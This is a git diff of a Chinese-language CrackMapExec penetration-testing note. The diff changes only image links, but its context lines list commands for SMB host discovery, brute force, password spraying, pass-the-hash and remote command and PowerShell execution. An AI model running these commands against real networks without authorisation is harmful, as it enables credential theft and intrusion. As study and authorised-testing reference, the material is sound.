@@ -1,13 +1,13 @@
   #### 信息收集
 	返回活动主机
 	>crackmapexec smb 192.168.0.0/24
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/252.png)
+![image](img/252.png)
   #### 爆破
 	支持协议ssh,smb,winrm,mssql,http
 	爆破smb协议，两台机器，一个用户名多个密码
 	>crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2
 	>crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p 'password' --shares
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/253.png)
+![image](img/253.png)
 
 	密码喷射
 	>crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
@@ -20,7 +20,7 @@
 	~/.cme/logs
 	查看协议可用后续模块
 	>crackmapexec smb -L
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/254.png)
+![image](img/254.png)
 
 	常用的模块
 	Get-ComputerDetails获取计算机信息
@@ -51,17 +51,17 @@
 	web_delivery 执行exploit/multi/script/web_delivery模块
 	查看模块的选项
 	>crackmapexec smb -M module --options
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/255.png)
+![image](img/255.png)
 
 	使用方式
 	>crackmapexec smb <target(s)> -u user -p 'P@ssw0rd' -M module -o 参数=值
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/256.png)
+![image](img/256.png)
   #### PTH
 	>crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
 	>crackmapexec smb <target(s)> -u username -H NTHASH
   #### 执行命令
 	>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -x 'command'
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/257.png)
+![image](img/257.png)
 
 	-X执行powershell命令
 	>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -X 'POWESHELL'
